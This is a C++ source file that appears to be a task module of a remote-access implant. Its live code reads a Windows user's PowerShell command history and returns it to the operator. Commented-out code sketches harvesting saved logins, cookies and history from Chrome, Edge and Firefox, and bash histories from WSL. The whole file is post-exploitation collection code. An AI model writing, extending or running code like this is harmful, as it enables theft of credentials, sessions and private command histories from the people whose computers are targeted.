#include "core/task.hpp"

namespace Task
{
    std::wstring History(State::PSTATE pState)
    {
        std::wstring result = L"";

        // Get env paths
        std::wstring envAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
        std::wstring envLocalAppData = System::Env::EnvStringsGet(pState->pProcs, L"%LOCALAPPDATA%");

        // Read PowerShell history file
        std::wstring wHistoryFile = envAppData + L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
        std::vector<BYTE> historyBytes = System::Fs::FileRead(pState->pProcs, wHistoryFile);
        if (historyBytes.size() > 0)
        {
            result += wHistoryFile + L"\n";
            result += std::wstring(wcslen(wHistoryFile.c_str()), L'-') + L"\n";

            std::wstring wHistory = Utils::Convert::UTF8Decode(std::string(historyBytes.begin(), historyBytes.end()));
            result += wHistory + L"\n\n";
        }

        // std::vector<std::wstring> historyFiles = {
        //     // Chrome
        //     // envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Cache"
        //     // envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"  *use sqlite3 to read data
        //     // envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\History"           *use sqlite3 to read data
        //     // envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Login Data"        *use sqlite3 to read data
        //     // envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Sessions"          *use sqlite3 to read data
        //     // FireFox
        //     // envAppData + L"\\Mozilla\\Firefox\\Profiles" 
        //     // envLocalAppData + L"\\Mozilla\\Firefox\\Profiles"
        //     // Microsoft Edge
        //     // envLocalAppData + L"\\Microsoft\\Edge\\User Data\\Default\\Cache"
        //     // envLocalAppData + L"\\Microsoft\\Edge\\User Data\\Default\\History"          *use sqlite3 to read data
        //     // envLocalAppData + L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"       *use sqlite3 to read data
        // };

        // for (const std::wstring& historyFile : historyFiles)
        // {
        //     result += historyFile + L"\n";
        //     result += std::wstring(wcslen(historyFile.c_str()), L'-') + L"\n";

        //     std::vector<char> readBytes = System::Fs::FileRead(pProcs, historyFile);
        //     if (readBytes.size() == 0)
        //     {
        //         result += L"No contents.\n\n";
        //         continue;
        //     }

        //     std::wstring wContent = UTF8Decode(std::string(readBytes.begin(), readBytes.end()));
        //     result += wContent + L"\n\n";
        // }

        // Try to read bash history on WSL
        // std::vector<std::wstring> wslHomeDirs = {
        //     L"\\\\wsl$\\Ubuntu\\home",
        //     L"\\\\wsl$\\kali-linux\\home"
        // };

        // for (const std::wstring& homeDir : wslHomeDirs)
        // {
        //     std::vector<std::wstring> files = System::Fs::GetFilesInDirectory(homeDir, TRUE);
        //     if (files.size() == 0)
        //     {
        //         continue;
        //     }

        //     for (const std::wstring file : files)
        //     {
        //         std::vector<std::wstring> fileSplit = Utils::Split::Split(file, L'/');
        //         std::wstring fileName = fileSplit.back();
        //         if (fileName == L".bash_history")
        //         {
        //             std::vector<char> readBytes = System::Fs::FileRead(pProcs, fileName);
        //             if (readBytes.size() == 0)
        //             {
        //                 result += L"No contents.\n\n";
        //                 continue;
        //             }

        //             result += fileName + L"\n";
        //             result += std::wstring(wcslen(fileName.c_str()), L'-') + L"\n";

        //             std::wstring wContent = Utils::Convert::UTF8Decode(std::string(readBytes.begin(), readBytes.end()));
        //             result += wContent + L"\n\n";
        //         }
        //     }
        // }

        return result;
    }
}